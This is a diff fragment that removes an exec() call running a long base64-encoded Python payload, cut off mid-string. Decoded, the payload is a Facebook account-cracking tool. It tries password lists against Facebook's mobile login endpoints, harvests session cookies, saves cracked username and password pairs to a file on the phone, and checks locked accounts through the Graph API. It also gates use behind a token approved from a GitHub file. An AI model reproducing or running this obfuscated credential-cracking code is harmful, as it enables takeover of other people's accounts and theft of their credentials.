@@ -1,2 +1,786 @@
-import base64
-exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24zDQojLSotY29kaW5nOnV0Zi04LSotDQojIFVwZGF0ZSBWMS42DQogDQojIyMgSW1wb3J0IE1vZHVsZQ0KaW1wb3J0IG9zDQp0cnk6DQogICAgaW1wb3J0IHJlcXVlc3RzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgcHJpbnQoJ1xuIE1vZHVsZSByZXF1ZXN0cyAhLi4uXG4nKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcmVxdWVzdHMnKQ0KIA0KdHJ5Og0KICAgIGltcG9ydCBjb25jdXJyZW50LmZ1dHVyZXMNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBwcmludCgnXG4gTW9kdWxlIGZ1dHVyZXMgIS4uLlxuJykNCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGZ1dHVyZXMnKQ0KIA0KdHJ5Og0KICAgIGltcG9ydCBiczQNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBwcmludCgnXG4gTW9kdWxlIGJzNCAhLi4uXG4nKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykNCiANCmltcG9ydCByZXF1ZXN0cywgb3MsIHJlLCBiczQsIHN5cywganNvbiwgdGltZSwgcmFuZG9tLCBkYXRldGltZSwgc3VicHJvY2VzcywgdGhyZWFkaW5nLCBpdGVydG9vbHMsYmFzZTY0LHV1aWQNCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgS0lOR05BU0VFUg0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwDQogDQogDQpjdCA9IGRhdGV0aW1lLm5vdygpDQpuID0gY3QubW9udGgNCmJ1bGFuID0gWydKYW51YXJpJywgJ0ZlYnJ1YXJpJywgJ01hcmV0JywgJ0FwcmlsJywgJ01laScsICdKdW5pJywgJ0p1bGknLCAnQWd1c3R1cycsICdTZXB0ZW1iZXInLCAnT2t0b2JlcicsICdOb3ZlbWJlcicsICdEZXNlbWJlciddDQp0cnk6DQogICAgaWYgbiA8IDAgb3IgbiA+IDEyOg0KICAgICAgICBleGl0KCkNCiAgICBuVGVtcCA9IG4gLSAxDQpleGNlcHQgVmFsdWVFcnJvcjoNCiAgICBleGl0KCkNCiANCmN1cnJlbnQgPSBkYXRldGltZS5ub3coKQ0KdGEgPSBjdXJyZW50LnllYXINCmJ1ID0gY3VycmVudC5tb250aA0KaGEgPSBjdXJyZW50LmRheQ0Kb3AgPSBidWxhbltuVGVtcF0NCiMjIyBXQVJOQSBSQU5ET00gIyMjDQpQID0gJ1x4MWJbMTs5N20nICMgUFVUSUgNCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSA0KSCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVDQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HDQpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQ0KVSA9ICdceDFiWzE7OTVtJyAjIFVOR1UNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENCk4gPSAnXHgxYlswbScgICAgIyBXQVJOQSBNQVRJDQpteV9jb2xvciA9IFsNCiBQLCBNLCBILCBLLCBCLCBVLCBPLCBOXQ0Kd2FybmEgPSByYW5kb20uY2hvaWNlKG15X2NvbG9yKQ0KIyAgQ0hJR09aSUVXT1JMRFdJREUuICAjDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLT4NCiANCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgUkVTUE9OU0UgRkFDRUJPT0sgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KZGF0YSxkYXRhMj17fSx7fQ0KYW1hbixjcCxzYWxhaD0wLDAsMA0KdWJhaFAscHdCYXJ1PVtdLFtdDQpvayA9IFtdDQpjcCA9IFtdDQppZCA9IFtdDQp1c2VyID0gW10NCmxvb3AgPSAwDQp1cmxfbG9va3VwID0gImh0dHBzOi8vbG9va3VwLWlkLmNvbS8iDQp1cmxfbWIgPSAiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbSINCnVybF9pcCA9ICJodHRwczovL3d3dy5odHRwYmluLm9yZy9pcCINCmhlYWRlcl9ncnVwID0geyJ1c2VyLWFnZW50IjogIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA5OyBLU0EtTFg5IEJ1aWxkL0hPTk9SS1NBLUxYOTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS85Ni4wLjQ2NjQuMTA0IE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQl9JQUIvRkI0QTtGQkFWLzMzNy4wLjAuMzIuMTE4O10ifQ0KYnVsYW5fdHRsID0geyIwMSI6ICJKYW51YXJ5IiwgIjAyIjogIkZlYnJ1YXJ5IiwgIjAzIjogIk1hcmNoIiwgIjA0IjogIkFwcmlsIiwgIjA1IjogIk1heSIsICIwNiI6ICJKdW5lIiwgIjA3IjogIkp1bHkiLCAiMDgiOiAiQXVndXN0dXMiLCAiMDkiOiAiU2VwdGVtYmVyIiwgIjEwIjogIk9jdG9iZXIiLCAiMTEiOiAiTm92ZW1iZXIiLCAiMTIiOiAiRGVjZW1iZXIifQ0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KZG9uZSA9IEZhbHNlDQpkZWYgYW5pbWF0ZSgpOg0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIGZvciBjIGluIGl0ZXJ0b29scy5jeWNsZShbJ1x4MWJbMTs5Mm18JywgJ1x4MWJbMTs5Mm0vJywgJ1x4MWJbMTs5Mm0tJywgJ1x4MWJbMTs5Mm1cXCddKToNCiAgICAgICAgaWYgZG9uZToNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidccntOfVt7T31/f39/f39/e059XSBMb2FkaW5nICcgKyBjKQ0KICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYnXHJ7Tn1be099f39/f39/f3tOfV0gTG9hZGluZyAnICsgYykNCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xye059W3tPfX9/f39/f397Tn1dIExvYWRpbmcgJyArIGMpDQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidccntOfVt7T31/f39/f39/e059XSBMb2FkaW5nICcgKyBjKQ0KICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYnXHJ7Tn1be099f39/f39/f3tOfV0gTG9hZGluZyAnICsgYykNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIHRpbWUuc2xlZXAoMC4wMykNCnQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1hbmltYXRlKQ0KdC5zdGFydCgpDQp0aW1lLnNsZWVwKDAuNSkNCmRvbmUgPSBUcnVlDQogDQojIGxlbXBhbmtra2tra2trDQpkZWYgamFsYW4oeik6DQogICAgZm9yIGUgaW4geiArICdcbic6DQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZSkNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIHRpbWUuc2xlZXAoMC4wMSkNCiANCiMgTE8gS09OVE9MDQpkZWYgbG9nbygpOg0KCXByaW50KCIiIg0KIA0KICAgICAgIyMjIyMjIyMgXDAzM1sxOzk3bSMjICAgICAjIyBcMDMzWzE7OTJtIyMjIyMjIyMNCiAgICAgICAgICMjICAgIFwwMzNbMTs5N20jIyAgICAgIyMgXDAzM1sxOzkybSMjDQogICAgICAgICAjIyAgICBcMDMzWzE7OTdtIyMgICAgICMjIFwwMzNbMTs5Mm0jIw0KICAgICAgICAgIyMgICAgXDAzM1sxOzk3bSMjIyMjIyMjIyBcMDMzWzE7OTJtIyMjIyMjDQogICAgICAgICAjIyAgICBcMDMzWzE7OTdtIyMgICAgICMjIFwwMzNbMTs5Mm0jIw0KICAgICAgICAgIyMgICAgXDAzM1sxOzk3bSMjICAgICAjIyBcMDMzWzE7OTJtIyMNCiAgICAgICAgICMjICAgIFwwMzNbMTs5N20jIyAgICAgIyMgXDAzM1sxOzkybSMjIyMjIyMjDQogDQoNCiAgICAgICAg29vb29vb2yAg29vb29sgICAgICAg29sgICAgICDb2yAg29vb29sgINvb29vb2yAgDQogICAgICAgINvbICAgICAg29sgICDb2yAgICAgINvbICAgICAg29sg29sgICDb2yDb2yAgINvbIA0KICAgICAgICDb29vb29vbINvb29vb29sgICAgICDb2yAgICAgINvbINvb29vb29sg29sgICDb2yANCiAgICAgICAgICAgICDb2yDb2yAgINvbINvbICAg29sg29sgICDb2yDb2yAgINvbINvbICAg29sgDQogICAgICAgINvb29vb29sg29sgICDb2yAg29vb29sgICDb29vb2yAg29sgICDb2yDb29vb29sgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoNCiANCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQogICAgICAgICAgIENPREVEIEJZIDogU0FKSkFEDQogICAgICAgICAgIFdIQVRTQVBQIDogKzg4MDE4NDAyMTUxMDYgICAgDQogICAgICAgICAgIEZCIFBBR0UgIDogU0FKSkFEIEhFTFAgWk9ORSANCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09ICAgICAgICAgICANCiAgICAgICAgICAgICAgXHgxYlsxOzQxbVx4MWJbMTs5N21URVJBIEJBQiBITyBceDFiWzE7MG0iIiIpDQogDQpkZWYgcmVnKCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgbG9nbygpDQogICAgcHJpbnQgKCcnKQ0KICAgIHRpbWUuc2xlZXAoMC4wMDEpIA0KICAgIHRyeToNCiAgICAgICAgdG8gPSBvcGVuKCcvc2RjYXJkL0FuZHJvaWQvLmJzN250LnR4dCcsICdyJykucmVhZCgpDQogICAgZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQogICAgICAgIHJlZzIoKQ0KICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TSEFIWkFEQS1BSE1FRC1TQUpKQUQvQkVTVC1GSUxFLUNMT05FL21haW4vQXBwcm92ZWQudHh0JykudGV4dA0KICAgIGlmIHRvIGluIHI6DQogICAgICAgIHRpbWUuc2xlZXAoMikNCiAgICAgICAgcHl0aG9uX2phdmEoKQ0KICAgIGVsc2U6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBsb2dvKCkNCiAgICAgICAgcHJpbnQoJycpDQogICAgICAgIHByaW50ICgnXHRBcHByb3ZlZCBOb3QgRGV0ZWN0ZWQnKQ0KICAgICAgICBwcmludCAoJycpDQogICAgICAgIHByaW50ICgnIFwwMzNbMTs5N21Ub2tlbjogJyArIHRvKQ0KICAgICAgICBwcmludCgnIFdoYXRzQXBwIDogKzg4MDE4NDAyMTUxMDYnKQ0KICAgICAgICBpbnB1dCgnXDAzM1sxOzk3bSBQcmVzcyBFbnRlciBUbyBHZXQgQXBwcm92YWwgXDAzM1sxOzkybShGT1IgRlJFRSknKQ0KICAgICAgICBvcy5zeXN0ZW0oInhkZy1vcGVuIGh0dHBzOi8vbS5tZS9hYmFseGhvZGkucHkiKQ0KICAgICAgICByZWcoKQ0KIA0KZGVmIHJlZzIoKToNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBsb2dvKCkNCiAgICBwcmludCgnJykNCiAgICBwcmludCAoJ1x0QXBwcm92YWwgTm90IERldGVjdGVkJykNCiAgICBwcmludCgnJykNCiAgICBpZCA9IHV1aWQudXVpZDQoKS5oZXhbOjUwXQ0KICAgIHByaW50ICgnIFRva2VuIDogJyArIGlkKQ0KICAgIHByaW50KCcgV2hhdHNBcHAgOiArODgwMTg0MDIxNTEwNicpDQogICAgaW5wdXQoJyBQcmVzcyBFbnRlciBUbyBHZXQgQXBwcm92YWwgXDAzM1sxOzkybShGT1IgRlJFRSkgJykNCiAgICBvcy5zeXN0ZW0oInhkZy1vcGVuIGh0dHBzOi8vd2EubWUvKzg4MDE4NDAyMTUxMDYiKQ0KICAgIHNhdiA9IG9wZW4oJy9zZGNhcmQvQW5kcm9pZC8uYnM3bnQudHh0JywgJ3cnKQ0KICAgIHNhdi53cml0ZShpZCkNCiAgICBzYXYuY2xvc2UoKQ0KICAgIHJlZygpDQogDQogDQogDQojTUFTVUsgVE9LRU4NCmRlZiBUSEVTQUpKQUQoT0ssY3ApOg0KICAgIGlmIGxlbihPSykgIT0gMCBvciBsZW4oY3ApICE9IDA6DQogICAgICAgIHByaW50KCdcbi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQ0KICAgICAgICBwcmludCgnIENyYWNrIEhhcyBCZWVuIENvbXBsZXRlZC4nKQ0KICAgICAgICBwcmludCgnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpDQogICAgICAgIHByaW50KCcgWyVzKyVzXSBcMDMzWzE7OTJtIFNVQ0NFU1NGVUxMIDogJXMgLS0tIFwwMzNbMTs5N20vc2RjYXJkL1NBSkpBRC1PSy50eHQnJShPLE8sc3RyKGxlbihvaykpKSkNCiAgICAgICAgcHJpbnQoJyBbJXMrJXNdIFwwMzNbMTs5Mm0gQ0hFQ0tQT0lOVFMgOiAlcyAtLS0gXDAzM1sxOzk3bS9zZGNhcmQvU0FKSkFELUNQLnR4dCclKE8sTyxzdHIobGVuKGNwKSkpKQ0KICAgICAgICBwcmludCgnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpDQogICAgICAgIGlucHV0KGYiXG5cMDMzWzE7OTdtIFByZXNzIEVudGVyIFRvIFJldHVybiBUbyBNYWluIE1lbnUgIikNCiAgICAgICAgcHl0aG9uX2phdmEoKQ0KIA0KZGVmIHB5dGhvbl9qYXZhKCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgbG9nbygpDQogICAgaXBtID0gcmVxdWVzdHMuZ2V0KHVybF9pcCkuanNvbigpIA0KICAgIElQID0gaXBtWyJvcmlnaW4iXQ0KICAgIHByaW50KCIgXDAzM1sxOzk1bSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iKTt0aW1lLnNsZWVwKDAuMDMpDQogICAgcHJpbnQoIiBcMDMzWzE7OTJtICAgICAgICAgICAgICBUIEggRSBNIE8gSCBTIEkgTiIpDQogICAgcHJpbnQoIiBcMDMzWzE7OTVtIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpO3RpbWUuc2xlZXAoMC4wMykNCiAgICBwcmludCgiIFwwMzNbMTs5N20gSVAgQUREUkVTUyAgICAgICAgWyVzXVxuIiUoSVApKTt0aW1lLnNsZWVwKDAuMDEpDQogICAgcHJpbnQoIiBcMDMzWzE7OTdtIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpO3RpbWUuc2xlZXAoMC4wMykNCiAgICBwcmludCgiIFwwMzNbMTs5NG0gICAgICAgICAgICAgRG9udCBQbGF5IFdpdGggTWUgISIpDQogICAgcHJpbnQoIiBcMDMzWzE7OTRtICAgICAgICAgICAgIEJlY2F1c2UgSSBrbm93IEkgQ2FuIikNCiAgICBwcmludCgiIFwwMzNbMTs5NG0gICAgICAgICAgICAgICAgUExBWSBCZXR0ZXIgVGhhbiBZb3UiKQ0KICAgIHByaW50KCIgXDAzM1sxOzk3bSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iKTt0aW1lLnNsZWVwKDAuMDMpDQogICAgcHJpbnQoIlwwMzNbMTs5N20gWzFdIEZJTEUgQ1JBQ0siKQ0KICAgIHByaW50KCJcMDMzWzE7OTFtIFswXSBFWElUIikNCiAgICBwcmludCgiIikNCiAgICBwZXBlayA9IGlucHV0KCdcMDMzWzE7OTdtIFNlbGVjdCA6ICcpDQogICAgaWYgcGVwZWsgaW5bJzEnLCcwMSddOg0KICAgICAgIF9feHl6X18oKS5qYW51KGlkKQ0KICAgICAgICAgICAgDQogDQpjbGFzcyBfX3h5el9fOg0KIA0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCiAgICAgICAgc2VsZi5pZCA9IFtdDQogDQogICAgZGVmIGphbnUoc2VsZixpZCk6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBsb2dvKCkNCiAgICAgICAgcHJpbnQoIiBcMDMzWzE7OTdtIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpO3RpbWUuc2xlZXAoMC4wMykNCiAgICAgICAgcHJpbnQoIiAgICAgICAgICAgICAgRklMRSBDUkFDSyBNRU5VIikNCiAgICAgICAgcHJpbnQoIiBcMDMzWzE7OTdtIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpO3RpbWUuc2xlZXAoMC4wMykNCiAgICAgICAgcHJpbnQoJycpDQogICAgICAgIHNlbGYuY250ID0gaW5wdXQoJyVzICBUWVBFIEZJTEUgTkFNRSA6JXMgJyUoUCxLKSkNCiAgICAgICAgc2VsZi5pZCA9IG9wZW4oc2VsZi5jbnQpLnJlYWQoKS5zcGxpdGxpbmVzKCkNCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgICAgIGxvZ28oKQ0KICAgICAgICBpbnB1dCgnJXMgIFByZXNzIEVOVEVSIElGIFlPVSBXQU5UIFRPIENPVU5USU5VRSBQUk9DRVNTIDolcyAnJShQLEspKQ0KICAgICAgICBfX193b3JsZHdpZGVfX18gPSAoJ3knKQ0KICAgICAgICBpZiBfX193b3JsZHdpZGVfX18gaW4gKCd5ZXMnLCdZZXMnLCdZJywgJ3knKToNCiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICAgICAgbG9nbygpDQogICAgICAgICAgICBwcmludCgiIFwwMzNbMTs5N20gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIik7dGltZS5zbGVlcCgwLjAzKQ0KICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTs5MSAgICAgICAgICAgICAgU0VMRUNUIE1FVEhPRCIpDQogICAgICAgICAgICBwcmludCgiIFwwMzNbMTs5Mm0gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIik7dGltZS5zbGVlcCgwLjAzKQ0KICAgICAgICAgICAgcHJpbnQoJycpDQogICAgICAgICAgICBwcmludCgnIFsxXSBNZXRob2QgMSAoUXVpdCBCZXN0KScpDQogICAgICAgICAgICBwcmludCgnIFsyXSBNZXRob2QgMiAoQmVzdCknKQ0KICAgICAgICAgICAgY2hpID0gaW5wdXQoJyAgQ2hvb3NlIG1ldGhvZDogJykNCiAgICAgICAgICAgIHNlbGYuX19wbGVyX18oKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcHJpbnQoJyBXUk9ORyBJTlBVVCAnKTtzZWxmLmphbnUoaWQpDQogICAgZGVmIF9fbWV0b2RlX18oc2VsZiwgdXNlciwgX19jaGlfXywgY2hhY2hhamkpOg0KICAgICAgICBnbG9iYWwgb2ssY3AsbG9vcA0KICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYnXHIgW1RIRSBTQUpKQURdIHtsb29wfS97bGVuKHNlbGYuaWQpfSAtLSBPSzotIHtsZW4ob2spfSAtIENQOi0ge2xlbihjcCl9ICcpLA0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZm9yIHB3IGluIF9fY2hpX186DQogICAgICAgICAgICAgICAgcHcgPSBwdy5sb3dlcigpDQogICAgICAgICAgICAgICAgc2Vzc2lvbj1yZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgICAgICBoZWFkZXIgPSB7DQogICAgICAgICAgICAgICAgICAgICJIb3N0IjpjaGFjaGFqaSwNCiAgICAgICAgICAgICAgICAgICAgInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwNCiAgICAgICAgICAgICAgICAgICAgInVzZXItYWdlbnQiOiJNb3ppbGxhLzUuMCAoTWVlR29Ob2tpYU45KSBBcHBsZVdlYktpdC81MzQuMTMgKEtIVE1MLCBsaWtlIEdlY2tvKSBOb2tpYUJyb3dzZXIvOC41LjAgTW9iaWxlIFNhZmFyaS81MzQuMTMiLA0KICAgICAgICAgICAgICAgICAgICAiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwNCiAgICAgICAgICAgICAgICAgICAgImRudCI6IjEiLA0KICAgICAgICAgICAgICAgICAgICAieC1yZXF1ZXN0ZWQtd2l0aCI6Im1hcmsudmlhLmdwIiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLW1vZGUiOiJjb3JzIiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC11c2VyIjoiZW1wdHkiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsDQogICAgICAgICAgICAgICAgICAgICJyZWZlcmVyIjoiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS8iLA0KICAgICAgICAgICAgICAgICAgICAiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSBiciIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgciA9IHNlc3Npb24uZ2V0KGYiaHR0cHM6Ly97Y2hhY2hhaml9L2luZGV4LnBocD9uZXh0PWh0dHBzJTNBJTJGJTJGZGV2ZWxvcGVycy5mYWNlYm9vay5jb20lMkZ0b29scyUyRmRlYnVnJTJGYWNjZXNzdG9rZW4lMkYiLCBoZWFkZXJzPWhlYWRlcikNCiAgICAgICAgICAgICAgICBkYXMgPSB7DQogICAgICAgICAgICAgICAgICAgICJsc2QiOnJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJywgc3RyKHIudGV4dCkpLmdyb3VwKDEpLA0KICAgICAgICAgICAgICAgICAgICAiamF6b2VzdCI6cmUuc2VhcmNoKCduYW1lPSJqYXpvZXN0IiB2YWx1ZT0iKC4qPykiJywgc3RyKHIudGV4dCkpLmdyb3VwKDEpLA0KICAgICAgICAgICAgICAgICAgICAidWlkIjp1c2VyLA0KICAgICAgICAgICAgICAgICAgICAiZmxvdyI6ImxvZ2luX25vX3BpbiIsDQogICAgICAgICAgICAgICAgICAgICJwYXNzIjpwdywNCiAgICAgICAgICAgICAgICAgICAgIm5leHQiOiJodHRwczovL2RldmVsb3BlcnMuZmFjZWJvb2suY29tL3Rvb2xzL2RlYnVnL2FjY2Vzc3Rva2VuLyINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaGVhZGVyMSA9IHsNCiAgICAgICAgICAgICAgICAgICAgIkhvc3QiOmNoYWNoYWppLA0KICAgICAgICAgICAgICAgICAgICAiY2FjaGUtY29udHJvbCI6Im1heC1hZ2U9MCIsDQogICAgICAgICAgICAgICAgICAgICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjoiMSIsDQogICAgICAgICAgICAgICAgICAgICJvcmlnaW4iOiJodHRwczovLyIrY2hhY2hhamksDQogICAgICAgICAgICAgICAgICAgICJjb250ZW50LXR5cGUiOiJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLA0KICAgICAgICAgICAgICAgICAgICAidXNlci1hZ2VudCI6Ik1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMjsgU0FNU1VORyBTTS1OOTcxTikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgU2Ftc3VuZ0Jyb3dzZXIvMTYuMCBDaHJvbWUvOTcuMC40Njc0LjIgTW9iaWxlIFNhZmFyaS81MzcuMzYiLA0KICAgICAgICAgICAgICAgICAgICAiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwNCiAgICAgICAgICAgICAgICAgICAgIngtcmVxdWVzdGVkLXdpdGgiOiJYTUxIdHRwUmVxdWVzdCIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6InNhbWUtb3JpZ2luIiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1tb2RlIjoiY29ycyIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtdXNlciI6ImVtcHR5IiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLA0KICAgICAgICAgICAgICAgICAgICAicmVmZXJlciI6Imh0dHBzOi8vIitjaGFjaGFqaSsiL2luZGV4LnBocD9uZXh0PWh0dHBzJTNBJTJGJTJGZGV2ZWxvcGVycy5mYWNlYm9vay5jb20lMkZ0b29scyUyRmRlYnVnJTJGYWNjZXNzdG9rZW4lMkYiLA0KICAgICAgICAgICAgICAgICAgICAiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSBiciIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcG8gPSBzZXNzaW9uLnBvc3QoZiJodHRwczovL3tjaGFjaGFqaX0vbG9naW4vZGV2aWNlLWJhc2VkL3ZhbGlkYXRlLXBhc3N3b3JkLz9zaGJsPTAiLCBkYXRhID0gZGFzLCBoZWFkZXJzID0gaGVhZGVyMSwgYWxsb3dfcmVkaXJlY3RzID0gRmFsc2UpDQogICAgICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6DQogICAgICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZidccntIfSBbU0FKSkFELU9LXSB7dXNlcn0gfCB7cHd9JykNCiAgICAgICAgICAgICAgICAgICAgd3J0ID0gJyVzfCVzJyAlICh1c2VyLHB3KQ0KICAgICAgICAgICAgICAgICAgICBvay5hcHBlbmQod3J0KQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL1NBSkpBRC1PSy50eHQnICwgJ2EnKS53cml0ZSgnJXNcbicgJSB3cnQpDQogICAgICAgICAgICAgICAgICAgIHNlbGYuZm9sbG93KHNlc3Npb24sY29raSkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBlbGlmICdjaGVja3BvaW50JyBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW56ID0gb3BlbignLnRva2VuLnR4dCcpLnJlYWQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgY3BfdHRsID0gc2Vzc2lvbi5nZXQoZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS97dXNlcn0/ZmllbGRzPWJpcnRoZGF5JmFjY2Vzc190b2tlbj17dG9rZW56fScpLmpzb24oKVsnYmlydGhkYXknXQ0KICAgICAgICAgICAgICAgICAgICAgICAgbW9udGgsIGRheSwgeWVhciA9IGNw